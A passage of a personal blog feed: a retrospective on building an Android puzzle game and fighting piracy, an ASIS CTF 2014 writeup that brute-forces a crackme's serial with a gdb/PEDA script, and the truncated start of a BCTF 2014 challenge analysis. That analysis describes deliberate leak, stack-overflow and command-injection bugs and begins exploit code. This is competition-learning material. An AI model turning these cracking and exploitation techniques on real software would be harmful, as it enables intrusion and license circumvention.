<p>第二个可怕之处在于像乐米这样的广告平台，本身就是一个盗版应用集散地，同时也为盗版应用提供技术支持，形成了盗版利益链条中的中间重要一环。我不知道还有多少像乐米这样的广告平台，因为在 Google 搜索乐米，甚至都在前面得不到搜索结果，但我知道，一个链条的形成和运转必然不会只有一个中枢，一定有一批像乐米的平台处于其中，分工明确，协作赚钱，最终，破坏的是市场，侵犯的是开发者的权益，受伤害的是最终用户。</p>

<p>世界如此之大，我不能明白为什么只有中国的市场如此的混乱，3 年前的时候，我还年少，富有热情去做这样一个游戏，而现在，即使有热情也会被这混乱不堪的市场局面所浇灭吧。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[积木的欢乐旅程]]></title>
    <link href="http://blog.ztrix.me/blog/2014/07/06/joystacker-review/"/>
    <updated>2014-07-06T14:02:50+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/07/06/joystacker-review</id>
    <content type="html"><![CDATA[<p>3 年前的一个月黑风高夜，大家都还很年轻，我们几个小朋友聚在一起，想尝试做点 Android 游戏开发。我拉来了同班同学诚哥，拉来了高中同学张光耀。两个程序员加一个美工，开始了一番离奇刺激又不乏艰辛的奇幻旅程。</p>

<p>大家一番讨论之下，决定做一款简单好玩的益智类游戏。我一拍大脑想到了几年前曾经玩过的一个叫做 superstacker2 的 Flash 游戏（现在这个游戏已经有了 Android 版本，当时还没有，想玩 Flash 原版请戳<a href="http://www.kongregate.com/games/inxile_ent/super-stacker-2">这里</a> ），于是想把这个游戏做到手机上一定很好玩，而且，我们可以增加重力感应关卡，微创新嘛！当然我们还想了其他很多乱七八糟好玩又离奇的功能，但是最终都没有付诸实践。</p>

<!-- more -->


<p>初期的开发是很快的。我们用了 AndEngine 作为游戏引擎，用了 box2d 作为物理引擎。糙快猛的一番鼓捣之后，第一个版本就做完了，那个时候张光耀还没工作，学工业设计出身和对漫画感兴趣的他，对现代界面和游戏界面设计其实也没有很强的感觉，于是第一个版本的界面很是粗糙。关卡方面，我匆忙设计了 20 个初始关卡，放在一个屏幕里面，重力感应和普通关卡是混杂的，也没有音乐和音效。就这样，我们就称之为第一个版本做好了吧。</p>

<p>第一个版本做好之后，我们就拿去参加谷歌 Android 应用开发中国大学生挑战赛。真好赶上 2011 年，谷歌刚办第二届。</p>

<p>哦，忘了说了，最开始的名字还不叫欢乐积木，叫做快乐积木，版本是 1.0。</p>

<p>比赛分区域进行，抱着试试看的心态提交了游戏，拉上康总作为指导老师，没想到，结果下来之后，居然是<a href="http://www.google.cn/university/androidchallenge/2011/regional.html#tab=UNDEFINED-CONTENT-ITEM-2">北京赛区一等奖</a>。</p>

<p><img src="http://blog.ztrix.me/images/joystacker/google-android-contest-2011.png" alt="Google-Android-University-Contest-2011" /></p>

<p>当时还是有点小激动的。于是就为了决赛又做了一系列优化，把当时有能力做的事情都做了，发布了 <a href="http://blog.ztrix.me/downloads/happy-stacker_1.1.apk">1.1 版本</a>，满心期待的参加决赛。</p>

<pre><code>version 1.1 changelog

1，增加到了40个关卡
2，增加了菜单按钮的点击状态
3，关卡存储增加了加密措施
4，重画了程序开始画面的背景，标题更加清晰明亮
5，修改了三角形碰撞检测的 bug
6，动态检测积木是否可以放，如果在不能放的地方，那么积木变红，表示不能放置
7，修复了多点触摸带来的bug
8，增加了指向当前积木的箭头，增加了待放积木移动的动画
9，重新做了关卡选择页面的美工图片，增加了关卡屏幕切换效果
10，解决了三角形积木显示附带一条白线的bug
11，修复了积木可放置性判断不在积木中点的bug
12，修复了待放积木移动时，最后一个直接出现的bug
13，修复了 monkey 测试出错的bug
14，为每关增加了最高分显示，在选择关卡界面增加了星星数量显示
15，增加了退出确认对话框
16，修复了大屏幕下，关卡选择页面出错的问题
17，增加了来电话等情况游戏自动暂停的处理
18，增加了指向当前待放积木的箭头
19，增加了游戏暂停的积木动画
20，修复了积木并未下落但是关卡失败的bug（多线程未加锁）
21，不允许将积木放在deadline上的判断，积木会变红示意玩家不能放置。
22，修复了积木缩略图造成的崩溃
23，修复了menu里面积木表情跳变的bug
24，增加了跳动的开始游戏文字
25，增加了纯色长条的长度，避免太大的失真
26，计算分数考虑了积木的稳定性
27，增加了教学步骤
28，给重力关卡增加了 G 标志
29，给游戏中的所有积木增加了许多种表情
30，修复了长条表情模糊的问题
31，增加了过关显示星星数量
32，过关如果是新最高分增加了最高分显示
33，增加了通关恭喜画面
34，增加了menu中的 help 按钮，用于帮助用户玩游戏
35，对关卡背景做了调优
36，增加了内存优化，尽量少占用内存
37，前面的20个关卡根据用户反馈做了调整
38，重构了所有代码
</code></pre>

<p>满心期待等来的结果是无尽的失望，在总决赛中最终只获得了优秀奖。可能是评委口味不同了吧，决赛的名次非常出乎意料，大家都看好的几款软件都没有得到好名次，一等奖二等奖反而不是那么有说服力，而我的积木，作为预赛北京赛区一等奖，决赛中名次反而比北京赛区的其他作品名次低很多。</p>

<p>埋怨太多有没有用，现在看来，当时的作品确实是十分粗糙的，至少我现在自己都看不下去。比赛也就如此了，生活还要继续。于是积木就暂时放在那里了，没有管它。</p>

<p>2012 年，我认识了大神张泽清。他是 <a href="https://www.teambition.com/">teambition</a> 的创始人之一，设计天才，难得的是，他其实是学编程开发出身的，我记得是上海交大某计算机相关专业，所以，写代码也不在话下，综合起来看，张泽清是我认识的各路大神中，设计+开发综合技能值最高的。</p>

<p>他玩了玩这个游戏之后，觉得玩法还不错，于是花了一个下午（真的只用了一个下午！3D 建模乱七八糟的都是顺手拈来啊，看的我眼花缭乱），做了现在的界面。</p>

<p>这里放图对比一下，左边是老界面，右边是新界面：</p>

<p><img src="http://blog.ztrix.me/images/joystacker/cmp1.jpg" alt="对比1" /></p>

<p><img src="http://blog.ztrix.me/images/joystacker/cmp2.jpg" alt="对比2" /></p>

<p>既然界面终于感觉能看了，我顿时又有了把游戏好好再重构一下，做一个足够质量的，可以放到市场给大家玩的版本的信念。</p>

<p>由于一直都是抽空在做，这个过程是漫长的，断断续续做了很久。一种做东西就要做好的奇怪感觉充斥在我心里，我做了非常多的细节上的优化工作，从代码质量，到文件大小，到界面细节，我都做了力所能及的精细打磨。</p>

<p>后来我增加到了 100 个关卡，为此，我还专门制作了<a href="http://stackeditor.sinaapp.com/editor.html">关卡编辑器</a>，每个关卡的设计都经过精心的调试，保证趣味性和难度的统一（作为趣味游戏来说，其实是难度太高了，一般人真玩不动。。）。</p>

<p>我还做了游戏音乐和音效（是的！现在游戏音乐音效听起来如此不专业的原因就是，是我做的！），凭着对音乐的一点点感觉，学习了一下 GarageBand 就做了其中的开场音乐和过场音乐，以及每个积木的不同音效。虽然很挫，但也是完成了一桩心愿。</p>

<p>长久的拖沓与不能忍受残次的某种怪癖导致，两年过去了，我才最终把积木扔到了 <a href="https://play.google.com/store/apps/details?id=com.rayx.stacker">Play Store</a> 上。这个时候，版本号终于变成了 1.2，也就是说，1.1 版本到 1.2 版本，就这么零零散散断断续续絮絮叨叨疯疯狂狂的过了 2 年。</p>

<p>引以为豪的是，在界面适配上做了大量工作之后，现在积木的界面可以适配我遇到过的所有 Android 机型和平板。后来，我遇到了 Samsung 变态 1080p 分辨率的 Galaxy S4，我尝试运行了一下，界面适配仍然是十分完美。甚至在兼容性方面，我一直做到了兼容 Android 1.6，在 Play Store 上发布的时候，Play Store 就会显示，本次发布的 Apk 兼容 6387 种 Android 设备，不兼容的设备为 0。后来我们在 360 的 testin 云测上进行了测试，发现除了联想的第一代 Android 手机不能正常运行之外，其他手机都可以正常运行无压力。</p>

<p>除此之外，Play Store 上的统计显示，在数十万的 session 中，Crash and ANR 总 report 仅为 2，而且还是因为加载图片导致 OutOfMemory 导致的。</p>

<p>1.2 版本放上去之后，我既没有宣传，也没有做推广。对于一个只懂开发的团队来说，似乎事情已经做完了，下一步该怎么办呢？我没有思路。于是就在 Play Store 上那么放着吧。国内的各种山寨菜市场我觉得太乱，都没有放，于是相当于放弃了国内用户。</p>

<p>于是就那么放在那里了，没有任何波澜，但是生活还要继续。</p>

<p>一段时间之后，当我打开 Play Store 控制台的时候，惊奇地发现，游戏居然还是有点用户的，虽然不多，只有 4000 多一点，但是遍布世界各地几十个国家，还有不少用户写了很长的评论来骂我，说游戏玩了半天，结果发现有 bug，游戏进度不能保存，前面玩过的都白玩了，真是愚蠢的游戏。我顿时感动的痛哭流涕，积木还是有一点存在感的，好吧既然有存在感我就修复一下 bug 吧。</p>

<p>一番检查发现，进度不能保存居然是由于 Android 系统升级造成的密码函数默认参数变化导致的，修复了之后，就发布了版本 1.3 。这个时候，又是大半年时光过去了。后来，当我想升级游戏引擎的时候，发现 AndEngine 已经接口大变，根本没法适配到以前的接口了，而且，我还改过一部分 AndEngine 代码，于是，便不再改了，当我想升级 Google Analytics 代码的时候，也发现真是各种麻烦，甚至我想升级 Android Studio 的新 Gradle 系统的时候，都各种不能正确解决。一个项目就这样横跨多年，时过境迁，经历 Android 生态的变革，真是感慨万分，算了，都不升级了，就这样罢。</p>

<p>到了 2014 年，又遇到几个小朋友。几个小朋友一玩游戏就是爱不释手，又给我一种似乎游戏不是那么挫的假象。后来，遇到了另外一位朋友，他也觉得很好玩，说想帮我做推广。我想了想说好，反正不会有什么结果，就当做推广练习吧。</p>

<p>于是，在他的要求之下，加上了分享过关截图和社交分享功能。本来积木只需要网络权限的，为了集成 <a href="http://sharesdk.cn/">ShareSDK</a>，一下子添加了七八个敏感权限，真是痛心。</p>

<p>我还做了一个<a href="http://joystacker.rayx.io/">官方主页</a>，哎，只花了一个小时你们就别吐槽不兼容手机，不好看，啥玩意了，虽然我也不忍吐槽说这是我做的，但是夜里 2 点不睡觉来写网页真的已经是怀着无限的美好向往和全人类繁荣发展的美好信念了。</p>

<p>终于弄好了，再次升级版本上线，这次注册了人人、新浪微博、facebook、twitter 等各种官方账号，并且，新浪微博还专门找了水军转发，感觉好激动呢。只不过，等等，同学，水军质量堪忧啊！</p>

<p><img src="http://blog.ztrix.me/images/joystacker/js-forward.jpg" alt="water-army" /></p>

<p><img src="http://blog.ztrix.me/images/joystacker/low-forwarder.png" alt="water-army" /></p>

<p>唉，我都看不下去了，赶紧让同学帮忙转发起来，终于把第一页转发和评论弄和谐了。。</p>

<p>让我非常诧异的事情是，盗版猖獗啊，速度快过 Chrome 版本号啊！就在不久前，我看到<a href="http://weibo.com/2417104112/B8QNH2yBr?type=repost">清华美院同学的设计作品在各个市场被盗版和抄袭的事情</a>，还在想盗版何以如此之快，哪知道两天后就体会到了啊。先来看一下盗版的量：</p>

<p><img src="http://blog.ztrix.me/images/joystacker/pirated.png" alt="pirated" /></p>

<p>豌豆荚你是怎么想的啊。。这么多长得一模一样的应用上线，怎么对得起豌豆荚高质量的名号啊，好在正版的下载量位居第一，稍微有点安慰(咦真的是没有刷榜吗就上万下载量了？不敢相信啊。。)。</p>

<p>再看这家盗版</p>

<p><img src="http://blog.ztrix.me/images/joystacker/anzhuoapk.png" alt="anzhuoapk" /></p>

<p>这位盗版同学，你盗版都好意思把公司名称写出来吗？你上传个游戏截图，能不能保持比例不变形啊！还有，第三关根本不是你那么玩的啊！！！你盗版也好好玩一下啊！！</p>

<p>注意上面这张图的时间，2014 年 6 月 13，也就是我发布国内版本刚刚 1 天就被盗版，速度之快令人咂舌。</p>

<p>我在 google analytic 后台，看到了至少有 5 家不同的盗版，甚至还有盗版占据了更高版本号！</p>

<p><img src="http://blog.ztrix.me/images/joystacker/joystacker-version.png" alt="img" /></p>

<p>我只想吐槽，盗版商你们不给力啊！盗版了不宣传不推广怎么赚钱啊！本来还指望你们盗版商给我免费推广呢啊！你们现在还没我正版下载多，怎么赚钱啊！玩毛啊！摔！</p>

<p>其实，除了业界良心无广告正版之外，我曾经还上线过一个有广告 1.5 版本，想看看广告收入情况如何，结果 1.5 版本最终收益是。。当当当当，50 块钱，于是瞄了一眼盗版应用在我这里的记录。。还不到我 1.5 版本的使用数。。盗版商童鞋，你那么辛苦盗版一下，才挣不到 50 块钱，真是感觉为你们心寒呢！</p>

<p>盗版就不说那么多了，我会再写一篇盗版技术分析的文章来说这个事情。</p>

<p>最终的最终，当这个欢乐的旅程走向终点的时候，我依然想吐槽，想做一个好游戏是多么累的一件事情，大家花了大量的精力、时间，玩过的人都说好，评论质量也很高(Play Store Rating 在 3.8 左右)，但是没有推广、没有运营，游戏就是没人玩，也不会有收入，更没法抵挡盗版大军的随意侵袭（当我向豌豆荚投诉盗版应用的时候，豌豆荚表示需要我提供软件著作权才能下架对方盗版）。还有市场如此混乱，各个市场各有各的奇葩要求，真是累觉不爱，人艰不拆。</p>

<p>现在回顾这一切，心态早已不同，也不会再去做曾经的这些事情了。</p>

<p>感谢诚哥、张光耀、张泽清大神、刘超、董玲曾经的付出，这是一个欢乐的旅程，虽然最终没有多少回报，但是能与各位并肩作战，完成一个有存在感、看起来萌萌傻傻、玩起来却又挑战智商的游戏，还是幸福感爆棚的！</p>

<p>谨以此文纪念曾经的少年热情。</p>

<p>最终放上游戏下载链接 <a href="http://joystacker.rayx.io">官方主页</a>，求别吐槽，自己下载玩就行，好人一生平安！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Power of PEDA - ASIS CTF Quals 2014 Serial Number Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup/"/>
    <updated>2014-05-10T23:09:41+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Again, another ELF x86_64 binary with very long bit operation logic asking for some serial number.</p>

<p>I can still remember the time <a href="http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/">trying to solve Turututu</a>, during which I spent a lot of time trying to figure out what happened under the instructions, but sadly with no luck, it&rsquo;s totally a mess. The lucky thing is that <a href="http://github.com/longld/peda">peda</a> is really a powerful tool, and I can guess the hidden logic with the help of <a href="http://github.com/longld/peda">peda</a>, so I finally solved Turututu.</p>

<p>So let&rsquo;s show what a powerful tool <a href="http://github.com/longld/peda">peda</a> is by solving this challenge without figuring out that long bit operation logic(over 1 thousand lines of asm code!).</p>

<!-- more -->


<p>First, it&rsquo;s easy to understand the overall logic. Here is the pseudocode(python-like).</p>

<pre><code>serial_number = some_8_bytes_integer
state = 0   # four bit state
correct_serial = 0

while serial_number &gt; 0:
    nibble = serial_number &amp; 0xf
    serial_number = serial_number &gt;&gt; 4
    correct_serial = nibble == 0xd &amp;&amp; state == 0xd
    state = some_very_long_logic_over_a_thousand_lines_of_asm(nibble, state)

if correct_serial:
    print 'Congratulations!'
</code></pre>

<p>Here, nibble and state are both 4 bit variables. So no matter what the <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> function is, there is only <code>16 x 16 = 256</code> possibilities. Just brute-force them all using <a href="http://github.com/longld/peda">peda</a>!</p>

<p>So I wrote the following <a href="http://github.com/longld/peda">peda</a> helper function, by setting breakpoint at end of <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> and using <code>set $rip=0x400788</code>, we can run that piece of code multiple times.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">god</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    god mode</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>    <span class="n">msg</span><span class="p">(</span><span class="s">&#39;god mode&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">rbp</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">getreg</span><span class="p">(</span><span class="s">&#39;rbp&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">array_pointers</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x28</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_state</span><span class="p">():</span>
</span><span class='line'>        <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>            <span class="n">pointer</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">array_pointers</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>            <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">pointer</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">ret</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">set_state</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>            <span class="n">pointer</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">array_pointers</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>            <span class="n">peda</span><span class="o">.</span><span class="n">write_int</span><span class="p">(</span><span class="n">pointer</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">state</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">check_one</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">init</span><span class="p">):</span>
</span><span class='line'>        <span class="n">peda</span><span class="o">.</span><span class="n">write_int</span><span class="p">(</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">peda</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;set $rip=0x400788&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># msg(&#39;extracted = %d%d%d%d, remain = %x&#39; % (peda.read_int(rbp-0x44, 4), peda.read_int(rbp-0x48, 4), peda.read_int(rbp-0x4c, 4), peda.read_int(rbp-0x50, 4), peda.read_int(rbp-0x68, 8)))</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">set_state</span><span class="p">(</span><span class="n">init</span><span class="p">)</span>
</span><span class='line'>        <span class="n">peda</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&#39;continue&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">state2</span> <span class="o">=</span> <span class="n">get_state</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="n">state2</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">final</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
</span><span class='line'>        <span class="n">init</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="o">&gt;&gt;</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
</span><span class='line'>            <span class="n">rs</span> <span class="o">=</span> <span class="n">check_one</span><span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">init</span><span class="p">)</span>
</span><span class='line'>            <span class="n">msg</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%x</span><span class="s">: </span><span class="si">%s</span><span class="s"> -&gt; </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">j</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">rs</span><span class="p">))</span>
</span><span class='line'>            <span class="n">final</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">j</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">rs</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">msg</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">final</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, the only thing left is <code>gdb -x gdb.x</code>, here it is.</p>

<pre><code>file serial-number
b *0x4014d8
b *0x40149c
run
</code></pre>

<p>Then use god mode to brute force.</p>

<p>After brute force and a little processing, we can get the following jump table</p>

<pre><code>0 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0]
1 [0, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
2 [0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
3 [3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3]
4 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12]
5 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 0, 0]
6 [0, 0, 0, 0, 0, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
7 [7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7]
8 [0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0]
9 [0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
10 [0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
11 [11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11]
12 [0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0]
13 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
14 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0]
15 [15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15]
</code></pre>

<p>So the serial number is <code>da34c5217f9d</code>.</p>

<p>Can you feel the power of <a href="http://github.com/longld/peda">peda</a> tonight?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BCTF 2014 决赛题 - Secret Guard 回顾与分析]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/"/>
    <updated>2014-05-07T09:08:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p><a href="http://blog.ztrix.me/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">secret-guard</a> 作为 BCTF 2014 决赛中最简单的一道 binary 题目，设计目标为，能够在放出后 4 个小时左右被各队逐渐解出，达到一波得分高潮。漏洞设置方面，设置了 3 个不同类型的简单漏洞，分别属于信息泄露、栈溢出和命令注入，期望是各个队伍发现不同的漏洞，达到互有攻防，反复抢占阵地的激烈效果。</p>

<p>根据比赛的实际情况来看，题目足够简单，作为最简单的 binary 题目，4 个小时内被解出的目标完成了，但是没有想到的是，在很长的一段时间内，只有 HITCON 217 一个队伍解出这道简单题目，并且只利用了其中命令注入的最简单漏洞。赛后的交流得知，开始时很多人以为每个题目只有一个漏洞，于是找到漏洞之后，就去看别的题目了，没有再仔细研究这个题目。另外，不知道是由于此题攻击流量分析较为困难还是各个队伍经验较少的原因，所有其他队伍一直处于被打状态而没有及时修补，导致得分差距太大，所以总体感觉甚为惋惜，花费心思设置的各个漏洞和坑点大家都没有遇到，也没有达到预期的效果。</p>

<h2>关于这题的一些统计信息</h2>

<!-- more -->


<table>
<thead>
<tr>
<th></th>
<th> 队伍     </th>
<th align="center">      攻击次数      </th>
<th align="center">  被攻击次数 </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> HITCON 217    </td>
<td align="center"> 716 </td>
<td align="center"> 0   </td>
</tr>
<tr>
<td></td>
<td> 0ops          </td>
<td align="center"> 379 </td>
<td align="center"> 12  </td>
</tr>
<tr>
<td></td>
<td> DISA          </td>
<td align="center"> 307 </td>
<td align="center"> 79  </td>
</tr>
<tr>
<td></td>
<td> Light4Freedom </td>
<td align="center"> 229 </td>
<td align="center"> 575 </td>
</tr>
<tr>
<td></td>
<td> Pax.Mac Team  </td>
<td align="center"> 197 </td>
<td align="center"> 91  </td>
</tr>
<tr>
<td></td>
<td> Sigma         </td>
<td align="center"> 137 </td>
<td align="center"> 86  </td>
</tr>
<tr>
<td></td>
<td> 我是狗汪汪    </td>
<td align="center"> 87  </td>
<td align="center"> 661 </td>
</tr>
<tr>
<td></td>
<td> 无名          </td>
<td align="center"> 284 </td>
<td align="center"> 116 </td>
</tr>
</tbody>
</table>


<br/>


<h2>总体服务状态</h2>

<ul>
<li>1 &ndash; down</li>
<li>31 &ndash; error</li>
<li>1597 &ndash; ok</li>
</ul>


<h2>漏洞分析</h2>

<p>首先要看懂程序逻辑，作为 secret guard，它打开的第一个秘密文件其实就是 flag 文件。并且将 flag 的前一半作为 secret key。每次连接服务，可以给一个随机数种子，然后获得 secret key 中的一个 byte。</p>

<p>随后，程序会向用户询问 16 个关于 secret key 的问题，如果全部答对，才能得到 access 权限。</p>

<p>取得权限之后，用户可以输入一个 pid，然后程序会调用 lsof 命令，打印出这个 pid 打开的秘密文件有哪些。</p>

<h3>漏洞一 &ndash; 任意信息泄露漏洞</h3>

<p>首先，随机数种子确定的时候，随机数的序列是固定的。因此很容易找到一个序列，让他们作为随机种子之后，随机得到 0 1 2 &hellip; 15 的序列。有了这个序列之后，是可以轻松获得 flag 的前面一半的。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_char</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
</span><span class='line'>    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">))</span>
